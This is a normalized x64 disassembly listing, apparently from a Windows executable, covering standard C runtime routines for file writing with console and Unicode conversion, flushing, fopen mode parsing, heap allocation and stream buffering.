add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_14004eaa0
sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_14004ea20
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_14004ea50
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_14004eaf4
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1a30 ]
mov eax 0x1b30
call sub_14003d700
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1a20 ] rax
xor edi edi
mov r14d r8d
mov r13 rdx
and [ rsp + 0x44 ] edi
movsxd rbx ecx
test r8d r8d
jne r-xdata
test rdx rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov r15 rbx
mov r12 rbx
lea rax [ rw-data ]
sar r12 0x5
and r15d 0x1f
mov rcx [ rax + r12 * 8 ]
mov [ rsp + 0x50 ] r12
imul r15 r15 0x58
mov sil [ r15 + rcx + 0x38 ]
mov [ rsp + 0x60 ] r15
add sil sil
sar sil 0x1
cmp sil 0x2
je r-xdata
call sub_14003f1c4
and [ rax ] edi
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov rcx [ rbp + 0x1a20 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x1b88 ]
add rsp 0x1b30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r14d
not eax
test al 0x1
je r-xdata
cmp sil 0x1
jne r-xdata
test [ r15 + rcx + 0x8 ] 0x20
je r-xdata
mov ecx ebx
call sub_1400514c8
test eax eax
je r-xdata
xor edx edx
mov ecx ebx
lea r8d [ rdx + 0x2 ]
call sub_140050450
lea rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ r15 + rcx + 0x8 ] 0x80
je r-xdata
lea rax [ rw-data ]
mov rax [ rax + r12 * 8 ]
test [ r15 + rax + 0x8 ] 0x80
je r-xdata
mov rcx [ r15 + rcx ]
and [ rsp + 0x20 ] rdi
lea r9 [ rsp + 0x48 ]
mov r8d r14d
mov rdx r13
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor ebx ebx
mov r12 r13
test sil sil
jne r-xdata
call sub_140043c34
xor ebx ebx
lea rdx [ rsp + 0x5c ]
mov rcx [ rax + 0xc0 ]
lea rax [ rw-data ]
cmp [ rcx + 0x14 ] ebx
mov rcx [ rax + r12 * 8 ]
mov rcx [ r15 + rcx ]
sete bl
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov edi [ rsp + 0x48 ]
xor ebx ebx
jmp r-xdata
cmp sil 0x2
jne r-xdata
test r14d r14d
je r-xdata
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
test r14d r14d
je r-xdata
test r14d r14d
je r-xdata
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rax [ rcx + rax * 8 ]
test [ r15 + rax + 0x8 ] 0x40
je r-xdata
lea edx [ rbx + 0xd ]
call [ GetConsoleCP@IAT ]
and [ rsp + 0x58 ] edi
mov rbx r13
mov [ rsp + 0x5c ] eax
test r14d r14d
je r-xdata
test sil sil
je r-xdata
sub edi [ rsp + 0x44 ]
mov eax edi
test ebx ebx
je r-xdata
mov r8d 0xd
mov edx 0xd
call sub_14003f1a4
mov [ rax ] 0x1c
call sub_14003f1c4
and [ rax ] 0x0
jmp r-xdata
cmp [ r13 ] 0x1a
je r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ r12 ]
inc r12
cmp al 0xa
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
test sil sil
jne r-xdata
cmp ebx 0x5
jne r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
lea rax [ rsp + 0x70 ]
sub ecx eax
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x28 ] 0xd55
mov eax ecx
mov ecx 0xfde9
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov r9d eax
lea rax [ rbp + 0x620 ]
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r15d eax
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
or eax 0xffffffff
jmp r-xdata
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
inc rcx
mov [ rsi ] al
inc rsi
cmp rcx 0x13ff
jb r-xdata
mov [ rsi ] dl
inc r15d
inc rsi
inc rcx
cmp sil 0x1
je r-xdata
mov cl [ rbx ]
xor eax eax
cmp cl 0xa
sete al
mov [ rsp + 0x4c ] eax
lea rax [ rw-data ]
mov rdx [ rax + r12 * 8 ]
cmp [ r15 + rdx + 0x50 ] 0x0
je r-xdata
mov ecx ebx
call sub_14003f1e4
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
call sub_14003f1c4
mov [ rax ] ebx
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
xor esi esi
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp rdx 0x6a8
jb r-xdata
mov [ rcx ] r8w
add rcx 0x2
add rdx 0x2
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
add rcx 0x2
mov [ rsi ] ax
add rsi 0x2
cmp rcx 0x13fe
jb r-xdata
mov [ rsi ] dx
add r15d 0x2
add rsi 0x2
add rcx 0x2
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
movzx eax [ rbx ]
xor r12d r12d
cmp ax 0xa
mov [ rsp + 0x40 ] ax
sete r12b
add rbx 0x2
mov [ rsp + 0x4c ] r12d
jmp r-xdata
cmp sil 0x2
jne r-xdata
movsx ecx cl
call sub_14004fd00
test eax eax
je r-xdata
mov al [ r15 + rdx + 0x4c ]
mov [ rsp + 0x61 ] cl
mov r8d 0x2
mov [ rsp + 0x60 ] al
and [ r15 + rdx + 0x50 ] 0x0
lea rdx [ rsp + 0x60 ]
jmp r-xdata
mov r15 [ rsp + 0x60 ]
call [ GetLastError@IAT ]
mov ebx eax
add esi [ rsp + 0x48 ]
cmp r15d esi
jg r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
cmp sil 0x1
je r-xdata
mov r12d [ rsp + 0x4c ]
mov r8d 0x1
mov rdx rbx
mov rax r14
sub rax rbx
add rax r13
cmp rax 0x1
jle r-xdata
lea rcx [ rsp + 0x40 ]
call sub_14004fcb0
cmp eax 0xffffffff
je r-xdata
mov edi r12d
mov r8d 0xd
sub edi r13d
cmp edi r14d
jb r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
movsxd rcx esi
lea rdx [ rbp + rcx + 0x620 ]
mov r8d r15d
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov rax [ rsp + 0x60 ]
lea r9 [ rsp + 0x48 ]
mov rcx [ rax + rcx ]
sub r8d esi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
movzx ecx [ rsp + 0x40 ]
call sub_140052960
cmp ax [ rsp + 0x40 ]
jne r-xdata
cmp sil 0x2
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx [ rsp + 0x5c ]
lea rax [ rsp + 0x60 ]
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
inc rbx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r12d eax
test eax eax
je r-xdata
mov al [ rbx ]
lea rdx [ rw-data ]
inc edi
mov rcx [ rdx + r12 * 8 ]
mov [ r15 + rcx + 0x4c ] al
mov rax [ rdx + r12 * 8 ]
mov [ r15 + rax + 0x50 ] 0x1
lea rcx [ rsp + 0x40 ]
mov r8d 0x2
mov rdx rbx
call sub_14004fcb0
cmp eax 0xffffffff
je r-xdata
lea rcx [ rsp + 0x70 ]
xor edx edx
cmp r15d esi
jg r-xdata
add edi 0x2
test r12d r12d
je r-xdata
mov r12 [ rsp + 0x50 ]
mov rcx [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov rcx [ rax + rcx * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d r12d
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc rbx
jmp r-xdata
mov r12d 0xd
mov ecx r12d
mov [ rsp + 0x40 ] r12w
call sub_140052960
cmp ax [ rsp + 0x40 ]
jne r-xdata
jmp r-xdata
mov edi ebx
sub edi r13d
add edi [ rsp + 0x44 ]
cmp [ rsp + 0x58 ] r12d
jl r-xdata
inc edi
inc [ rsp + 0x44 ]
cmp [ rsp + 0x4c ] 0x0
mov r12 [ rsp + 0x50 ]
je r-xdata
mov eax ebx
sub eax r13d
cmp eax r14d
jae r-xdata
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov [ rsp + 0x60 ] 0xd
mov rcx [ rax + r12 * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d 0x1
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x58 ] 0x1
jl r-xdata
inc [ rsp + 0x44 ]
inc edi
jmp r-xdata
sub_14004f254
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_14003f1c4
and [ rax ] 0x0
call sub_14003f1a4
mov [ rax ] 0x9
jmp r-xdata
call sub_14003f1c4
and [ rax ] 0x0
call sub_14003f1a4
mov [ rax ] 0x9
call sub_140043760
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_140046e5c
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
call sub_14003f1c4
and [ rax ] 0x0
or ebx 0xffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_14004eaf4
mov ebx eax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_140046f04
mov eax ebx
jmp r-xdata
sub_14004f334
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
call sub_140043760
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov rsi rdi
sar rsi 0x5
lea r12 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_140046e5c
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
or ebx 0xffffffff
mov ecx edi
call sub_140046de8
mov rcx rax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
xor ebx ebx
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_140046f04
mov eax ebx
jmp r-xdata
call sub_14003f1c4
mov [ rax ] ebx
test ebx ebx
je r-xdata
sub_14004f40c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r15
sub rsp 0x30
mov ebp [ rw-data ]
mov rsi r9
xor r9d r9d
xor r10d r10d
xor r11d r11d
cmp [ rdx ] 0x20
lea r15d [ r9 + 0x1 ]
mov r12d r8d
mov rbx rdx
mov r13 rcx
jne r-xdata
cmp [ rbx ] 0x61
je r-xdata
add rbx r15
cmp [ rbx ] 0x20
je r-xdata
mov edi 0x109
cmp [ rbx ] 0x72
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
mov r8d 0x4000
xor edi edi
or ebp r15d
jmp r-xdata
cmp [ rbx ] 0x77
je r-xdata
add rbx r15
cmp [ rbx ] 0x0
jne r-xdata
test r11d r11d
je r-xdata
movsx ecx al
cmp ecx 0x53
jg r-xdata
add rbx r15
mov edx r15d
mov al [ rbx ]
test al al
je r-xdata
mov edi 0x301
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
lea rcx [ rsp + 0x68 ]
mov r9d r12d
mov r8d edi
mov rdx r13
mov [ rsp + 0x20 ] 0x180
call sub_140053238
test eax eax
jne r-xdata
jmp r-xdata
sub ecx 0x54
je r-xdata
je r-xdata
or ebp 0x2
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r13
pop r12
pop rdi
pop rsi
retn
xor eax eax
jmp r-xdata
add [ rw-data ] r15d
and [ rsi + 0x8 ] eax
mov eax [ rsp + 0x68 ]
and [ rsi ] 0x0
and [ rsi + 0x10 ] 0x0
and [ rsi + 0x28 ] 0x0
mov [ rsi + 0x1c ] eax
mov [ rsi + 0x18 ] ebp
mov rax rsi
cmp [ rbx ] 0x20
je r-xdata
bt edi 0xc
jae r-xdata
sub ecx 0xe
je r-xdata
test r10d r10d
jne r-xdata
sub ecx 0x20
je r-xdata
add rbx r15
lea rcx [ r--data ]
mov r8d 0x3
mov rdx rbx
call sub_1400535bc
test eax eax
jne r-xdata
bts edi 0xc
xor edx edx
jmp r-xdata
test edi 0xc000
jne r-xdata
dec ecx
je r-xdata
mov r10d r15d
or edi 0x20
jmp r-xdata
add rbx r15
mov al [ rbx ]
test al al
jne r-xdata
sub ecx 0xb
je r-xdata
add rbx 0x3
jmp r-xdata
test edx edx
je r-xdata
bts edi 0xf
jmp r-xdata
test r9d r9d
jne r-xdata
sub ecx 0xb
je r-xdata
test dil 0x2
jne r-xdata
dec ecx
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
mov r9d r15d
or ebp r8d
jmp r-xdata
test r9d r9d
jne r-xdata
cmp ecx 0x6
jne r-xdata
and edi 0xfffffffe
and ebp 0xfffffffc
or edi 0x2
bts ebp 0x7
jmp r-xdata
mov r11d r15d
jmp r-xdata
sub ecx 0x18
je r-xdata
add rbx r15
cmp [ rbx ] 0x3d
jne r-xdata
mov r9d r15d
btr ebp 0xe
jmp r-xdata
test edi 0xc000
jne r-xdata
test dil 0x40
jne r-xdata
sub ecx 0xa
je r-xdata
add rbx r15
cmp [ rbx ] 0x20
je r-xdata
or edi r8d
jmp r-xdata
or edi 0x40
jmp r-xdata
bts edi 0x7
jmp r-xdata
cmp ecx 0x4
jne r-xdata
lea rdx [ r--data ]
mov r8d 0x5
mov rcx rbx
call sub_140053454
test eax eax
jne r-xdata
test r10d r10d
jne r-xdata
lea rdx [ r--data ]
mov r8d 0x8
mov rcx rbx
call sub_140053454
test eax eax
jne r-xdata
add rbx 0x5
bts edi 0x12
jmp r-xdata
mov r10d r15d
or edi 0x10
jmp r-xdata
lea rdx [ r--data ]
mov r8d 0x7
mov rcx rbx
call sub_140053454
test eax eax
jne r-xdata
add rbx 0x8
bts edi 0x11
jmp r-xdata
add rbx 0x7
bts edi 0x10
jmp r-xdata
sub_14004f6c4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
movsxd rax [ rbx + 0x18 ]
mov edi [ rbx + 0x14 ]
add rax [ rsi + 0x8 ]
jne r-xdata
call sub_14004e7ec
xor ecx ecx
test edi edi
je r-xdata
call sub_14004e7ec
or eax 0xffffffff
mov r9 [ rsi + 0x8 ]
movsxd r8 [ rbx + 0x18 ]
lea rdx [ r9 + r8 ]
test ecx ecx
je r-xdata
inc ecx
add rdx 0x8
cmp ecx edi
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rdx [ r8 + rax * 8 ]
mov eax [ rdx + r9 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r9
cmp rbp rax
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_14004f78c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi r9d
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_14003f898
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
cmp edi [ rax + rcx + 0x4 ]
jle r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rax + rcx + 0x4 ] edi
sub_14004f7f4
sub rsp 0x28
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
add rsp 0x28
jmp [ HeapSize@IAT ]
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or rax 0xffffffffffffffff
add rsp 0x28
retn
sub_14004f840
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] rdx
mov [ rsp + 0x40 ] r8d
mov rdx [ rdx ]
mov rax rcx
call sub_1400437c0
call rax
call sub_1400437f0
mov rcx rax
mov rdx [ rsp + 0x38 ]
mov rdx [ rdx ]
mov r8d 0x2
call sub_1400437c0
add rsp 0x28
retn
sub_14004f8b4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx r8
mov rdi rdx
test rcx rcx
je r-xdata
imul rdi rcx
mov eax 0x1
test rdi rdi
cmove rdi rax
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax rdi
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rdi
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0xc
test rbx rbx
je r-xdata
mov rcx rdi
call sub_140042ea4
test eax eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rbx ] 0xc
xor eax eax
cmp rdi 0xffffffffffffffe0
ja r-xdata
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx ] 0xc
jmp r-xdata
sub_14004f950
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor edi edi
mov rbx rdx
mov rsi rcx
test rdx rdx
je r-xdata
imul rbx r8
test rcx rcx
je r-xdata
xor edx edx
lea rax [ rdi - 0x20 ]
div rbx
cmp rax r8
jae r-xdata
mov rdx rbx
mov rcx rsi
call sub_14003e6d4
mov rsi rax
test rax rax
je r-xdata
call sub_14004f7f4
mov rdi rax
call sub_14003f1a4
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rax rsi
cmp rdi rbx
jae r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub rbx rdi
lea rcx [ rdi + rax ]
xor edx edx
mov r8 rbx
call sub_14003d760
sub_14004f9d8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x18 ]
test al 0x83
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
jmp r-xdata
mov eax 0xffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ rcx + 0x18 ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ rcx + 0x18 ] eax
jmp r-xdata
mov rax [ rcx + 0x10 ]
mov [ rcx ] rax
call sub_1400500b0
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ rdi + 0x18 ] eax
and [ rdi + 0x8 ] 0x0
cmp eax 0x1
je r-xdata
mov rcx rdi
call sub_14003be60
mov r8d [ rdi + 0x24 ]
mov rdx [ rdi + 0x10 ]
mov ecx eax
call sub_140044688
mov [ rdi + 0x8 ] eax
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
test [ rdi + 0x18 ] 0x82
jne r-xdata
cmp [ rdi + 0x24 ] 0x200
jne r-xdata
mov rcx rdi
call sub_14003be60
cmp eax 0xffffffff
je r-xdata
mov rcx [ rdi ]
add [ rdi + 0x8 ] 0xfffffffe
movzx eax [ rcx ]
add rcx 0x2
mov [ rdi ] rcx
jmp r-xdata
test [ rdi + 0x18 ] 0x8
je r-xdata
lea r11 [ rw-data ]
mov rcx rdi
call sub_14003be60
cmp eax 0xfffffffe
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax [ rdi + 0x24 ]
test [ rdi + 0x18 ] 0x400
mov ecx 0x1000
cmove eax ecx
mov [ rdi + 0x24 ] eax
bts [ rdi + 0x18 ] 0xd
mov rcx rdi
call sub_14003be60
mov rcx rdi
lea rsi [ rw-data ]
movsxd rbx eax
sar rbx 0x5
call sub_14003be60
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ rsi + rbx * 8 ]
jmp r-xdata
mov al [ r11 + 0x8 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_14004fb38
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x50
xor r12d r12d
mov rsi r8
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
cmp [ rdx ] r12b
jne r-xdata
lea rcx [ rbp - 0x20 ]
mov rdx r9
call sub_14003b928
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] r12d
jne r-xdata
test rcx rcx
je r-xdata
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
call sub_14004fcb8
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov [ rcx ] r12w
mov eax r12d
mov r9d 0x1
test rbx rbx
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov rax [ rbp - 0x20 ]
mov [ rsp + 0x20 ] rbx
mov ecx [ rax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbp - 0x20 ]
mov r9d [ rcx + 0x10c ]
cmp r9d 0x1
jle r-xdata
cmp [ rbp - 0x8 ] r12b
je r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
jmp r-xdata
movsxd rax [ rcx + 0x10c ]
cmp rsi rax
jb r-xdata
cmp esi r9d
jl r-xdata
mov eax 0x1
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_14003f1a4
mov [ rax ] 0x2a
cmp [ rbp - 0x8 ] r12b
je r-xdata
cmp [ rdi + 0x1 ] r12b
je r-xdata
mov ecx [ rcx + 0x4 ]
mov eax r12d
test rbx rbx
setne al
mov r8 rdi
mov edx 0x9
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
mov rcx [ rbp - 0x20 ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
mov r12 [ rsp + 0x78 ]
add rsp 0x50
pop rbp
retn
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov eax [ rcx + 0x10c ]
cmp [ rbp - 0x8 ] r12b
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_14004fcb8
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
call sub_14003b928
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_14004fd00
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_14003b928
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_14004fd48
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov r12d ecx
mov rcx rdx
mov rbx rdx
call sub_14003be60
mov edx [ rbx + 0x18 ]
movsxd rsi eax
test dl 0x82
jne r-xdata
test dl 0x40
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
xor edi edi
test dl 0x1
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test dl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_14003bc4c
add rax 0x30
cmp rbx rax
je r-xdata
or edx 0x20
mov [ rbx + 0x18 ] edx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and edx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] edx
mov ebp 0x2
lea rdx [ rsp + 0x48 ]
mov ecx esi
mov r8d ebp
mov [ rsp + 0x48 ] r12w
call sub_14004f254
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x2 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
sub eax 0x2
mov [ rbx + 0x8 ] eax
test ebp ebp
jle r-xdata
mov ecx esi
call sub_1400514c8
test eax eax
jne r-xdata
call sub_14003bc4c
add rax 0x60
cmp rbx rax
jne r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax r12w
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_14004f254
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_1400500b0
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rax [ rbx + 0x10 ]
mov [ rax ] r12w
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_1400504e8
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
